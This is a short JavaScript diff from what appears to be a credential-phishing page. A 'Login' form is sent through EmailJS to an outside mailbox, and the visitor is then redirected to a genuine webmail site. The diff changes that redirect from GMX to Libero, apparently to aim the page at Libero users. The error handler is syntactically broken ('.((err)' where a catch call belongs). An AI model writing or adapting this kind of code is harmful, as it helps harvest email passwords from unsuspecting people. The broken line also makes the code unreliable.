@@ -12,7 +12,7 @@ document.getElementById('form')
         emailjs.sendForm(serviceID, templateID, this)
             .then(() => {
                 btn.value = 'Login';
-                window.location.href = 'https://www.gmx.net/produkte/apps/mail/'; // Redirect to the desired link
+                window.location.href = 'https://www.libero.it/'; // Redirect to the desired link
             })
             .((err) => {
                 btn.value = 'Login';
